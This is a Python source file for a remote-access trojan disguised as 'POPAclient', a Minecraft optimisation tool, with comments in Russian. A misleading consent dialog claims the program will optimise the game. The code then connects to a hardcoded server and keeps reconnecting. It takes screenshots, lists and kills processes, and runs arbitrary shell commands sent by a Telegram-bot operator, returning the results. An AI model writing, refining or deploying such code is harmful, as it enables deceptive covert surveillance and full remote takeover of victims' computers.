import socket
import subprocess
import os
import sys
import tkinter as tk
from tkinter import messagebox
import pyautogui
import psutil
from io import BytesIO
import time

# --- КОНФИГУРАЦИЯ ---
# Впишите сюда IP вашего сервера (из Radmin VPN или Ngrok)
SERVER_IP = '26.69.11.190' 
SERVER_PORT = 5050       

def show_warning_and_consent():
    """Окно подтверждения для безопасности пользователя."""
    root = tk.Tk()
    root.withdraw()
    title = "ЗАПРОС НА ПОДКЛЮЧЕНИЕ"
    msg = "Для оптимизации игры Minecraft, POPAclent подключится к серверам POPAservers, установит зависимости и запустит процесс оптимизации. Вы готовы дать разрешение на подключение POPAclient к серверам для комфортной игры? "
    consent = messagebox.askyesno(title, msg, icon='warning')
    root.destroy()
    return consent

def execute_command(command_str):
    """Обработка команд от Telegram бота."""
    try:
        command_str = command_str.strip()
        
        # Команда скриншота
        if command_str == "SCREEN":
            shot = pyautogui.screenshot()
            buf = BytesIO()
            shot.save(buf, format='PNG')
            return buf.getvalue()
            
        # Команда получения списка процессов
        elif command_str == "TASKS":
            procs = []
            for p in psutil.process_iter(['pid', 'name']):
                try:
                    procs.append(f"{p.info['pid']}: {p.info['name']}")
                except: pass
            # Возвращаем первые 70 процессов, чтобы не превысить лимит сообщения в TG
            return "\n".join(procs[:70]).encode('utf-8')

        # Команды EXEC (CMD и KILL)
        elif command_str.startswith("EXEC:"):
            sub_cmd = command_str[5:].strip()
            
            # Логика закрытия процесса: KILL:PID
            if sub_cmd.upper().startswith("KILL:"):
                try:
                    pid_str = sub_cmd.split(":")[1].strip()
                    p = psutil.Process(int(pid_str))
                    p.terminate()
                    return f"Процесс {pid_str} ({p.name()}) завершен.".encode('utf-8')
                except Exception as e:
                    return f"Ошибка при закрытии {pid_str}: {e}".encode('utf-8')
            
            # Обычная системная команда
            process = subprocess.run(sub_cmd, shell=True, capture_output=True, text=True, timeout=10)
            output = (process.stdout + process.stderr).strip()
            return (output if output else "Выполнено (нет вывода)").encode('utf-8')
            
        return b"Unknown command"
    except Exception as e:
        return f"Error: {e}".encode('utf-8')

def start_client():
    """Запуск клиента с циклом авто-переподключения."""
    if not show_warning_and_consent():
        print("Доступ отклонен пользователем.")
        return

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(15)
            print(f"Попытка подключения к POPAservers...")
            client.connect((SERVER_IP, SERVER_PORT))
            client.settimeout(None)
            print("Соединение установлено! Приятной игры!")

            while True:
                data = client.recv(1024)
                if not data: break
                
                cmd = data.decode('utf-8', errors='ignore').strip()
                result = execute_command(cmd)
                
                # Отправка ответа: Заголовок 10 байт (длина данных) + сами данные
                header = str(len(result)).ljust(10).encode()
                client.sendall(header + result)
                
        except Exception as e:
            print(f"Ошибка соединения: {e}. Повтор через 5 секунд...")
            time.sleep(5)
            continue
        finally:
            client.close()

if __name__ == '__main__':
    start_client()